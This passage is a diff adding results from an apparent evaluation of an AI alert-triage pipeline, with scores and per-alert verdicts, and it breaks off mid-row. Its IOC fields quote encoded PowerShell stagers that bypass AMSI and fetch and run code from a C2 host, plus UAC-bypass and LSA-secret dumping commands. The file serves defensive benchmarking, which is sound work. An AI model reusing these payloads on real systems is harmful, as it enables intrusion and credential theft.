@@ -1,0 +1,1640 @@
+{
+  "meta": {
+    "config": "rag",
+    "retrieval": true,
+    "tools": false,
+    "tier1_model": "openrouter:nvidia/nemotron-3-super-120b-a12b:free",
+    "tier2_model": "openrouter:nvidia/nemotron-3-ultra-550b-a55b:free",
+    "escalate_below": 0.7,
+    "prompt_sha": "a7a0d78eaac5",
+    "alerts_sha": "0afbdf00aef8",
+    "tool_cache": "frozen",
+    "search": "vector+bm25",
+    "golden_sha": "b0695a44d0d4",
+    "split": {
+      "name": "test",
+      "sha": "f1ee9a08ce2a"
+    },
+    "git_shas": [
+      "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "b68422321372922e158eb8b69e53b6d901c63a74"
+    ],
+    "git_dirty": false,
+    "started_at": "2026-10-04T11:41:15+00:00",
+    "finished_at": "2026-10-06T15:25:48+00:00",
+    "alerts_planned": 30,
+    "alerts_run": 30,
+    "transport_errors": 0,
+    "complete": true
+  },
+  "scores": {
+    "triage": {
+      "accuracy": 0.9,
+      "n": 30,
+      "confusion": {
+        "true_positive": {
+          "true_positive": 19,
+          "benign_noisy": 1,
+          "needs_review": 0,
+          "error": 0
+        },
+        "benign_noisy": {
+          "true_positive": 2,
+          "benign_noisy": 8,
+          "needs_review": 0,
+          "error": 0
+        },
+        "needs_review": {
+          "true_positive": 0,
+          "benign_noisy": 0,
+          "needs_review": 0,
+          "error": 0
+        }
+      },
+      "per_class_recall": {
+        "true_positive": 0.95,
+        "benign_noisy": 0.8,
+        "needs_review": null
+      },
+      "missed_attacks": 1
+    },
+    "techniques": {
+      "precision": 0.5218253968253969,
+      "recall": 0.775,
+      "f1": 0.6236995104039168,
+      "primary_exact_rate": 0.5,
+      "alerts_with_gold": 20,
+      "alerts_with_pred": 21
+    },
+    "iocs": {
+      "hallucinated_ioc_rate": 0.017543859649122806,
+      "iocs_total": 57,
+      "iocs_hallucinated": 1,
+      "alerts_with_hallucination": 1,
+      "examples": [
+        {
+          "alert_id": "day3-098",
+          "iocs": [
+            "SQBmACgAJABQAFMAVgBFAHIAUwBpAG8ATgBUAGEAQgBsAEUALgBQAFMAVgBFAFIAcwBJAG8AbgAuAE0AQQBKAG8AUgAgAC0AZwBlACAAMwApAHsAJAA0ADMARABFADIAPQBbAFIARQBGAF0ALgBBAHMAcwBFAG0AYgBsAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBnACcAKQA7AEkARgAoACQANAAzAGQARQAyACkAewAkADcAMQAyAGQAQgA9ACQANAAzAEQAZQAyAC4ARwBlAFQAVgBBAEwAdQBlACgAJABuAFUATABsACkAOwBJAEYAKAAkADcAMQAyAGQAYgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADcAMQAyAEQAQgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADEAMgBEAEIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AEEATAA9AFsAQwBvAGwATABFAEMAdABJAG8AbgBzAC4ARwBlAE4AZQBSAEkAYwAuAEQASQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAcgBJAG4ARgAsAFMAeQBTAFQAZQBNAC4ATwBCAEoARQBjAFQAXQBdADoAOgBuAEUAVwAoACkAOwAkAHYAYQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBsAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANwAxADIAZABiAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAYQBsAH0ARQBsAHMAZQB7AFsAUwBjAHIASQBwAHQAQgBsAG8AYwBrAF0ALgAiAEcAZQB0AEYASQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAG4AdQBsAEwALAAoAE4AZQB3AC0ATwBCAEoARQBDAHQAIABDAG8ATABsAEUAQwBUAGkATwBuAFMALgBHAGUATgBlAHIAaQBjAC4ASABhAFMASABTAGUAdABbAHMAVABSAEkATgBnAF0AKQApAH0AJABSAGUARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAWQAuAEcAZQB0AFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIARQBGAC4ARwBFAHQARgBpAEUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEAbABVAEUAKAAkAE4AVQBMAEwALAAkAFQAUgBVAGUAKQA7AH0AOwBbAFMAWQBzAHQAZQBNAC4ATgBFAFQALgBTAEUAcgB2AGkAYwBFAFAATwBJAE4AVABNAEEATgBBAGcAZQByAF0AOgA6AEUAWABQAGUAYwBUADEAMAAwAEMAbwBuAFQASQBOAFUAZQA9ADAAOwAkADgAZgA1AGIAOQA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAFkAcwB0AEUATQAuAE4ARQBUAC4AVwBFAEIAQwBMAEkAZQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AFQALgBFAG4AQwBPAEQAaQBOAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAdAByAEkAbgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBPAE0AQgBhAFMARQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaHBACcAOwAkADgAZgA1AEIAOQAuAEgAZQBBAGQARQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADgARgA1AEIAOQAuAFAAcgBvAFgAWQA9AFsAUwBZAFMAdABFAG0ALgBOAEUAdAAuAFcAZQBCAFIAZQBxAHUARQBzAFQAXQA6ADoARABFAEYAYQBVAGwAVABXAEUAYgBQAFIAbwB4AHkAOwAkADgAZgA1AEIAOQAuAFAAUgBPAHgAeQAuAEMAcgBFAGQAZQBuAHQAaQBBAEwAcwAgAD0AIABbAFMAeQBzAHQARQBtAC4ATgBlAHQALgBDAHIARQBEAGUAbgBUAGkAQQBMAEMAQQBDAGgARQBdADoAOgBEAGUARgBBAHUATABUAE4ARQBUAFcATwByAEsAQwBSAGUAZABlAG4AdABJAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADgAZgA1AGIAOQAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAdABlAE0ALgBUAGUAWAB0AC4ARQBOAGMATwBEAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAMABdAHIAWAAzAFkANAA6ACgAKQBKAGMAaABBAEsAawRSADcAVgBnACsAWwAvAFUAcAA5ADIAdABtAEcAUQB2ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAOABmADUAQgA5AC4ASABlAGEARABFAHIAcS4AEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AGkAVwArAGgAMwBaAEQAeABFADcAQwBhAEYASwBMADYARwBpAGUATQBZAHgAWABnAHoARgBFAD0AIgApADsAJABEAGEAVABhAD0AJAA4AGYANQBiADkALgBEAG8AdwBuAEwATwBhAGQARABhAHQAYQAoACQAUwBFAFIAKwAkAHQAKQA7ACQASQB2AD0AJABkAGEAdABhAFsAMAAuAC4AMwBdADsAJABkAEEAVABhAD0AJABkAGEAVABBAFsANAAuAC4AJABEAEEAdABBAC4AbABFAE4AZwBUAEgAXQA7AC0ASgBvAEkAbgBbAEMAaABBAHIAWwBdAF0AKAAmACAAJABSACAAJABEAGEAVABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA="
+          ]
+        }
+      ]
+    },
+    "schema": {
+      "schema_valid_rate": 1.0,
+      "first_try_rate": 1.0,
+      "errors": 0
+    },
+    "cost_latency": {
+      "cost_per_alert_usd": 0.0,
+      "cost_known_rows": 30,
+      "latency_p95_s": 38.55
+    }
+  },
+  "rows": [
+    {
+      "config": "rag",
+      "alert_id": "day2-007",
+      "label": "benign_noisy",
+      "label_techniques": [],
+      "verdict": "true_positive",
+      "confidence": 0.7,
+      "technique_ids": [
+        "T1547.003"
+      ],
+      "ioc_refs": [
+        "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\SecureTimeLimits\\SecureTimeHigh",
+        "QWORD (0x01d68292-0x3f2eebc3)"
+      ],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].registry.target_object",
+        "events[0].registry.details"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 9.27,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/123fb12ceb43ea434d63225ae72d62df"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day2-015",
+      "label": "benign_noisy",
+      "label_techniques": [],
+      "verdict": "benign_noisy",
+      "confidence": 0.95,
+      "technique_ids": [],
+      "ioc_refs": [],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].registry.target_object",
+        "events[0].registry.details"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 6.42,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/35cde523f61d04206987ffe368c197a0"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day2-016",
+      "label": "benign_noisy",
+      "label_techniques": [],
+      "verdict": "benign_noisy",
+      "confidence": 0.8,
+      "technique_ids": [],
+      "ioc_refs": [
+        "C:\\windows\\system32\\svchost.exe",
+        "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Notifications\\Data\\418A073AA3BC3475"
+      ],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].registry.target_object",
+        "events[0].registry.details"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 5.11,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/e676a3e3a3c53b7c196db069e43d581d"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day2-025",
+      "label": "benign_noisy",
+      "label_techniques": [],
+      "verdict": "true_positive",
+      "confidence": 0.9,
+      "technique_ids": [
+        "T1021.003"
+      ],
+      "ioc_refs": [
+        "C:\\Windows\\System32\\smartscreen.exe -Embedding",
+        "C:\\Windows\\System32\\smartscreen.exe",
+        "C:\\Windows\\System32\\svchost.exe",
+        "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"
+      ],
+      "evidence_refs": [
+        "events[0].process.command_line",
+        "events[0].process.image",
+        "events[0].process.parent.image",
+        "events[0].process.parent.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 6.35,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/f7eb5b0c61f3b5835a3faaab43bb645f"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day2-027",
+      "label": "benign_noisy",
+      "label_techniques": [],
+      "verdict": "benign_noisy",
+      "confidence": 0.9,
+      "technique_ids": [],
+      "ioc_refs": [],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].process.command_line",
+        "events[0].process.parent.image",
+        "events[0].process.parent.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 5.15,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/845836a18d05147fbf85749eadf72525"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-042",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1218.001"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.85,
+      "technique_ids": [
+        "T1218.001",
+        "T1059.001"
+      ],
+      "ioc_refs": [
+        "C:\\ProgramData\\T1218.001.chm",
+        "C:\\Windows\\hh.exe"
+      ],
+      "evidence_refs": [
+        "events[0].process.parent.image",
+        "events[0].process.parent.command_line",
+        "events[0].process.image",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 6.24,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/c48f46669fd2c4812264fead91d91e3e"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-046",
+      "label": "benign_noisy",
+      "label_techniques": [],
+      "verdict": "benign_noisy",
+      "confidence": 0.95,
+      "technique_ids": [],
+      "ioc_refs": [
+        "C:\\Windows\\system32\\DFSRs.exe",
+        "HKLM\\System\\CurrentControlSet\\Services\\DFSR\\Parameters\\Replication Groups\\390B4687-8853-4659-92AC-163F08FBA6BB\\Replica Set Configuration File",
+        "\\\\?\\C:\\System Volume Information\\DFSR\\Config\\Replica_390B4687-8853-4659-92AC-163F08FBA6BB.XML"
+      ],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].registry.target_object",
+        "events[0].registry.details"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 5.14,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/4663d0eb2a514a35cfc7b8e960c80e58"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-052",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1047"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.9,
+      "technique_ids": [
+        "T1047",
+        "T1127.001"
+      ],
+      "ioc_refs": [
+        "C:\\Windows\\Tasks\\pshell.xml"
+      ],
+      "evidence_refs": [
+        "events[0].process.parent.image",
+        "events[0].process.image",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 5.14,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/84ffe17b288c96fa79304b0383d875df"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-054",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1204.002"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.8,
+      "technique_ids": [
+        "T1548.002"
+      ],
+      "ioc_refs": [
+        "C:\\Users\\Administrator\\Desktop\\launcher.exe",
+        "/NoUACCheck"
+      ],
+      "evidence_refs": [
+        "events[0].process.parent.command_line",
+        "events[0].process.image",
+        "events[0].process.parent.image"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 6.32,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/314df6c806b88f358cffacb59271e4ea"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-058",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1087.001"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.95,
+      "technique_ids": [
+        "T1059.001",
+        "T1087.001"
+      ],
+      "ioc_refs": [
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "C:\\Windows\\System32\\net.exe"
+      ],
+      "evidence_refs": [
+        "events[0].process.parent.image",
+        "events[0].process.image",
+        "events[0].process.parent.command_line",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 8.33,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/b2b7b1aebe3e9846cbfdd8fc7960e872"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-066",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1548.002"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.9,
+      "technique_ids": [
+        "T1546.001"
+      ],
+      "ioc_refs": [
+        "HKU\\S-1-5-21-3125456671-949036322-3048627137-1104_Classes\\ms-settings\\Shell\\Open\\command\\(Default)",
+        "-NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x"
+      ],
+      "evidence_refs": [
+        "events[0].registry.target_object",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 5.13,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/6133ff7ea6b339b75b4d97a3bbd9cb7f"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-077",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1059.001"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.95,
+      "technique_ids": [
+        "T1548.002",
+        "T1059.001"
+      ],
+      "ioc_refs": [
+        "C:\\Windows\\System32\\fodhelper.exe",
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "HKCU:Software\\Microsoft\\Windows Update"
+      ],
+      "evidence_refs": [
+        "events[0].process.parent.image",
+        "events[0].process.command_line",
+        "events[0].process.image"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 8.4,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/8cfb06811ba9fc08715bb5eb08c9e893"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-081",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1003.004"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.95,
+      "technique_ids": [
+        "T1003.004"
+      ],
+      "ioc_refs": [
+        "C:\\Users\\wardog\\Downloads\\PSTools\\PsExec.exe",
+        "PsExec.exe  -accepteula -s reg save HKLM\\security\\policy\\secrets C:\\Users\\wardog\\AppData\\Local\\Temp\\secrets"
+      ],
+      "evidence_refs": [
+        "events[0].process.image",
+        "events[0].process.command_line"
+      ],
+      "error": null,
+      "schema_retries": 0,
+      "cost_usd": 0.0,
+      "latency_s": 5.13,
+      "tier": 1,
+      "trace": "https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/7cde58169205ae3b7c4ab4a23a8289e3"
+    },
+    {
+      "config": "rag",
+      "alert_id": "day3-082",
+      "label": "true_positive",
+      "label_techniques": [
+        "T1059.001"
+      ],
+      "verdict": "true_positive",
+      "confidence": 0.95,
+      "technique_ids": [
+        "T1059.001"
+      ],
+      "ioc_refs": [
+        "SQBGACgAJABQAFMAVgBFAFIAcwBpAG8ATgBUAGEAQgBMAEUALgBQAFMAVgBFAHIAcwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAEUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcAZQB0AEYAaQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBGAEUANwA9ACQANgA4ADYANgAuAEcAZQB0AFYAQQBMAHUAZQAoACQAbgB1AGwATAApADsASQBGACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAEUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMAbwBsAGwARQBDAHQAaQBPAE4AcwAuAEcARQBOAGUAUgBpAGMALgBEAEkAYwBUAGkAbwBuAEEAUgB5AFsAUwBUAFIAaQBOAGcALABTAHkAcwBUAGUATQAuAE8AYgBqAEUAYwBUAF0AXQA6ADoATgBlAHcAKAApADsAJAB2AGEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEAZgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAGwAfQBFAGwAUwBlAHsAWwBTAGMAcgBpAFAAdABCAGwATwBDAEsAXQAuACIARwBlAHQARgBJAGUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBMAFUARQAoACQATgBVAGwAbAAsACgATgBlAFcALQBPAEIASgBFAEMAVAAgAEMATwBMAGwAZQBDAHQAaQBPAE4AUwAuAEcARQBuAEUAUgBpAEMALgBIAGEAcwBIAFMAZQB0AFsAcwB0AHIASQBuAEcAXQApACkAfQAkAFIAZQBmAD0AWwBSAGUARgBdAC4AQQBTAFMARQBNAGIATAB5AC4ARwBlAHQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAGUAdABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBsAHUAZQAoACQAbgB1AGwATAAsACQAdAByAHUARQApADsAfQA7AFsAUwB5AHMAVABFAE0ALgBOAEUAVAAuAFMAZQByAFYASQBDAGUAUABPAGkAbgB0AE0AYQBuAEEAZwBFAHIAXQA6ADoARQBYAHAARQBDAHQAMQAwADAAQwBvAE4AdABpAG4AVQBFAD0AMAA7ACQARgA5ADQARQA9AE4ARQBXAC0ATwBiAGoARQBjAFQAIABTAHkAUwB0AGUATQAuAE4ARQB0AC4AVwBlAGIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAG4AQwBPAEQAaQBOAGcAXQA6ADoAVQBuAEkAQwBPAGQARQAuAEcARQBUAFMAVABSAEkATgBHACgAWwBDAG8AbgB2AEUAUgBUAF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIASQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AGUALgBIAGUAQQBEAGUAUgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABmADkANABFAC4AUABSAE8AWABZAD0AWwBTAFkAUwB0AGUAbQAuAE4ARQB0AC4AVwBlAEIAUgBFAHEAVQBlAFMAVABdADoAOgBEAGUARgBBAHUATAB0AFcAZQBiAFAAcgBvAHgAWQA7ACQARgA5ADQARQAuAFAAcgBvAHgAWQAuAEMAUgBlAEQAZQBuAHQASQBhAGwAcwAgAD0AIABbAFMAWQBTAHQAZQBNAC4ATgBFAHQALgBDAFIARQBEAGUAbgB0AEkAYQBMAEMAQQBDAGgAZQBdADoAOgBEAGUAZgBhAHUATABUAE4AZQBUAHcATwByAEsAQwByAGUARABlAG4AdABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBTAHQARQBtAC4AVABFAFgAVAAuAEUATgBjAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAdABlAHMAKAAnADAAXQByAFgAMwBZADQAOgAoACkASgBjAGgAQQBLAGsAUgA3AFYAZwArAFsALwBVAHAAOQAyAHQAbQBHAFEAdgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAUwA7ACQAUwA